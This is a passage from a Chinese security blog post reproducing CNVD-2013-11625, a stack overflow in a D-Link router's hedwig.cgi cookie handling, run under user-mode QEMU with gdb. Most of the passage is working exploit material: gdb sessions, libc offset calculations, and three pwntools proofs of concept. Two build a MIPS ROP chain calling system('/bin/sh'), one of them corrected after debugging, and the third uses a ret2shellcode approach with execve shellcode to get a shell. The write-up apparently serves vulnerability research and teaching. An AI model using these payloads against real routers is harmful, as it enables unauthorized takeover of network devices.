<span class="token assign-left variable">LEN</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-c</span><span class="token variable">)</span></span>
<span class="token assign-left variable">cookie</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span>

<span class="token builtin class-name">echo</span> <span class="token variable">$INPUT</span> <span class="token operator">|</span> qemu-mipsel-static <span class="token parameter variable">-L</span> ./ <span class="token parameter variable">-0</span> <span class="token string">"hedwig.cgi"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token variable">$LEN</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token variable">$cookie</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span> <span class="token parameter variable">-g</span> <span class="token number">1234</span> ./htdocs/cgibin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里通过 <code>-g 1234</code> 在 1234 端口开启了 gdbserver 监听，<code>cat payload</code> 可以将 <code>payload</code> 文件中的内容读到 <code>uid=</code> 之后，<code>echo $INPUT |</code> 可以做到 POST 的效果，<code>-0</code> 就是 <code>argv[0]</code>，<code>-E</code> 是设置环境变量</p><p>然后执行 <code>run.sh</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B046.png" alt="CNVD-2013-11625复现46.png"></p><p>可以看到本机开启了 1234 端口：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B047.png" alt="CNVD-2013-11625复现47.png"></p><p>然后使用本机的 <code>gdb-multiarch</code> 连接 gdbserver：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> architecture mips
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> target remote <span class="token number">127.0</span>.0.1:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B048.png" alt="CNVD-2013-11625复现48.png"></p><p>但是发现 <strong>QEMU 用户模式连上 pwndbg 时，<code>vmmap</code> 无法看到 libc 的基地址</strong>：（libc 直接不显示，而是显示 <code>&lt;explored&gt;</code>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b main
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c

<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> vmmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B049.png" alt="CNVD-2013-11625复现49.png"></p><p><em>因此利用 Linux 的延迟绑定机制，当一个函数在第二次及以后被调用的时候，就会直接跳转到其相应的 <code>libc</code> 地址（真实地址）</em></p><blockquote><p>如果对延迟绑定这一块不太了解，详见本站的《<a href="29133b28.html">PLT表和GOT表</a>》一文</p></blockquote><p>我们在 IDA 下找两次跳转到同一个 libc 函数的地方，例如 <code>hedwigcgi_main()</code> 函数中：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B050.png" alt="CNVD-2013-11625复现50.png"></p><p>然后把 GDB 断点设置在这里：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b *0x4094C8
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B051.png" alt="CNVD-2013-11625复现51.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b *0x4094E4
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B052.png" alt="CNVD-2013-11625复现52.png"></p><p>获得 <code>memset()</code> 函数的真实地址为：<code>0x2b333a20</code></p><p>在路由器文件系统的 <code>/lib</code> 文件夹内，找到其所使用的 libc 文件：<code>libc.so.0</code></p><p>利用 <code>objdump</code> 查找 <code>memset()</code> 函数的偏移地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-T</span> ./libc.so.0 <span class="token operator">|</span> <span class="token function">grep</span> memset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B053.png" alt="CNVD-2013-11625复现53.png"></p><p>获得 <code>memset()</code> 函数的 libc 偏移为：<code>0x34a20</code></p><p>则 libc 基地址为：<code>0x2b333a20 - 0x34a20 = 0x2b2ff000</code>（如果计算结果最后三位不是 <code>000</code> 的话，那就说明算错了）</p><p>接下来就是 GDB 执行到 <code>hedwigcgi_main()</code> 函数结束将要返回的地方，观察返回地址来确定溢出的长度：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B037.png" alt="CNVD-2013-11625复现37.png"></p><p>不过我们 GDB 现在就是处在 <code>hedwigcgi_main()</code> 函数中，因此也可以直接运行到当前函数退出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> finish<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B054.png" alt="CNVD-2013-11625复现54.png"></p><p>显示返回地址 <code>0x646b6161</code> 不合法，<code>cyclic -l</code> 得到溢出到返回地址的长度为 1009</p><h4 id="向用户态-QEMU-传递-payload-参数"><a href="#向用户态-QEMU-传递-payload-参数" class="headerlink" title="向用户态 QEMU 传递 payload 参数"></a>向用户态 QEMU 传递 payload 参数</h4><blockquote><p>由于 QEMU 用户级复现不需要仿真，我们只需要用 <code>qemu-mipsel-static</code> 运行 <code>/htdocs/cgibin</code> 程序，然后将 payload 作为参数传递</p></blockquote><p>poc 如下：</p><ol><li>纯 ROP 链，即构造 <code>system("/bin/sh")</code> 来 getshell</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x2b2ff000</span>   <span class="token comment"># 根据自己调试的基地址来更改</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x159F4</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s0 (=&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x6DFD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  /bin/sh</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span> <span class="token comment"># s6  addiu $s0, 1 (=&gt; jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x13F8C</span><span class="token punctuation">)</span> <span class="token comment"># ra  move $a0, $s3 (=&gt; jalr $s6)</span>
 
payload <span class="token operator">=</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload
post_content <span class="token operator">=</span> <span class="token string">"winmt=pwner"</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>post_content<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个 poc 是 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> 大佬提供的，但是实测是打不通的：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B055.png" alt="CNVD-2013-11625复现55.png"></p><blockquote><p><strong>这里 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> 大佬本人也说是打不通的</strong></p><p>说是这个脚本的<code>ROP</code>链构造没什么问题，<strong>但是在用户模式下是打不通的</strong>，因为 <code>system()</code> 函数中有调用 <code>fork()</code> 函数，而 QEMU 用户模式是不支持多线程的，这里 <code>fork()</code> 的失败，会导致后面 <code>$fp</code> 是个空指针，就会出错，在系统模式打就不会出问题</p><p><mark>后来，我解决了这个 poc 无法 getshell 的问题，我发现问题在于 <code>b'/bin/sh'</code> 的偏移地址错误，当然 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> 大佬的问题可能与 QEMU 版本有关，因为 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> 大佬使用的是 <code>qemu-mipsel</code> 而我的是 <code>qemu-mipsel-static</code>，同时我和 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-949925.htm">winmt</a> 的 libc 基地址也是不一样的</mark></p></blockquote><p>调试一下，将 <code>poc.py</code> 的启动命令加上 <code>-g 1234</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token operator">-</span>g <span class="token number">1234</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GDB 连接后，我们直接进到漏洞函数 <code>hedwigcgi_main()</code> 中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> architecture mips
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> target remote <span class="token number">127.0</span>.0.1:1234

<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> b *0x409480
<span class="token punctuation">(</span>gdb-multiarch<span class="token punctuation">)</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后一路 <code>ni</code> 检查，发现前面都没有问题，最后 GDB 卡在这个地方：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B058.png" alt="CNVD-2013-11625复现58.png"></p><p>报了一个警告，并且无法再继续调试：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">warning: GDB can<span class="token string">'t find the start of the function at 0x2b312f8b.

    GDB is unable to find the start of the function at 0x2b312f8b
and thus can'</span>t determine the size of that <span class="token keyword">function</span><span class="token string">'s stack frame.
This means that GDB may be unable to access that stack frame, or
the frames below it.
    This problem is most likely caused by an invalid program counter or
stack pointer.
    However, if you think GDB should simply search farther back
from 0x2b312f8b for code which looks like the beginning of a
function, you can increase the range of the search using the `set
heuristic-fence-post'</span> command.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是考虑到我们 <code>ni</code> 单步调试的时候，前面两个 <code>sprintf()</code> 函数的执行都是没有问题的，这就有点奇怪</p><p>后来我在检查各个函数和 gadget 的地址的时候：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B056.png" alt="CNVD-2013-11625复现56.png"></p><p>我这里的 libc 基地址是 <code>0x2b2ff000</code>，发现 <code>system()</code> 函数的地址是没问题的</p><p>但是原本应该是 <code>b'/bin/sh'</code> 的地址却出现了很奇怪的 <code>b'H\2245+\234\3025+'</code>，但我就记得这个字符串很眼熟：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B059.png" alt="CNVD-2013-11625复现59.png"></p><p>这就是我们刚刚使用 poc 打失败的时候报的错误：<code>sh: 1: H\x945+\x9c\xc25+: not found</code></p><p>所以问题很明显了：<code>system()</code> 地址是对的，<code>system()</code> 的传参也是对的，但是参数不是 <code>"/bin/sh"</code></p><p>搜索 <code>b'/bin/sh'</code> 发现真正的地址应该是 0x2b359448，于是利用 ROPgadget 查一下 libc 中 <code>b'/bin/sh'</code> 的偏移，发现是 0x5a448：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B060.png" alt="CNVD-2013-11625复现60.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B057.png" alt="CNVD-2013-11625复现57.png"></p><p>修改一下 poc 中 <code>b'/bin/sh'</code> 的偏移，新的 poc 如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x2b2ff000</span>   <span class="token comment"># 根据自己调试的基地址来更改</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x53200</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># s0  system_addr - 1</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x159F4</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s0 (=&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
<span class="token comment"># payload += p32(libc_base + 0x6DFD0) # s3  /bin/sh</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x0005a448</span><span class="token punctuation">)</span> <span class="token comment"># s3  /bin/sh  原 poc 的偏移是错误的</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x32A98</span><span class="token punctuation">)</span> <span class="token comment"># s6  addiu $s0, 1 (=&gt; jalr $s1)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x13F8C</span><span class="token punctuation">)</span> <span class="token comment"># ra  move $a0, $s3 (=&gt; jalr $s6)</span>
 
payload <span class="token operator">=</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload
post_content <span class="token operator">=</span> <span class="token string">"winmt=pwner"</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>post_content<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再次运行 poc：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B061.png" alt="CNVD-2013-11625复现61.png"></p><p>成功！</p><ol start="2"><li>通过 shellcode 来 getshell（由于 MIPS 架构是无法开启 NX 保护的，因此可以使用 <code>ret2shellcode</code>，但需要注意 <code>shellcode</code> 中不能存在 <code>b'\x00'</code> 等字符防止导致 <code>sprintf</code> 被截断）</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'mips'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
 
libc_base <span class="token operator">=</span> <span class="token number">0x2b2ff000</span>   <span class="token comment"># 根据自己调试的基地址来更改</span>
 
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x436D0</span><span class="token punctuation">)</span> <span class="token comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x56BD0</span><span class="token punctuation">)</span> <span class="token comment"># s3  sleep</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x57E50</span><span class="token punctuation">)</span> <span class="token comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span>
 
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x37E6C</span><span class="token punctuation">)</span> <span class="token comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x3B974</span><span class="token punctuation">)</span> <span class="token comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span>
 
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
    slti $a2, $zero, -1
    li $t7, 0x69622f2f
    sw $t7, -12($sp)
    li $t6, 0x68732f6e
    sw $t6, -8($sp)
    sw $zero, -4($sp)
    la $a0, -12($sp)
    slti $a1, $zero, -1
    li $v0, 4011
    syscall 0x40404
'''</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
payload <span class="token operator">+=</span> shellcode
 
payload <span class="token operator">=</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload
post_content <span class="token operator">=</span> <span class="token string">"winmt=pwner"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""
    qemu-mipsel-static -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""</span><span class="token string">" + payload + b"</span><span class="token string">""</span>\" \
    <span class="token operator">-</span>E REQUEST_URI<span class="token operator">=</span><span class="token string">"2333"</span> \
    <span class="token punctuation">.</span><span class="token operator">/</span>htdocs<span class="token operator">/</span>cgibin
<span class="token string">""</span>"<span class="token punctuation">,</span> shell <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>post_content<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行 poc：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CNVD-2013-11625%E5%A4%8D%E7%8E%B062.png" alt="CNVD-2013-11625复现62.png"></p><p>直接一发入魂！</p></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>CNVD-2013-11625复现</h></span></div><div class="post-copyright__type"><span class="post-copyright-info">本文链接：<a href="https://www.uf4te.cn/posts/c2233a9.html">https://www.uf4te.cn/posts/c2233a9.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a" style="padding-left:6px;display:inline-block;width:120px"><h>作者</h><div class="post-copyright-cc-info"><h>uf4te</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-06-12</h></div></div><div class="post-copyright-u" style="padding-left:6px;display:inline-block;width:120px"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-06-22</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/GDB/">GDB</a><a 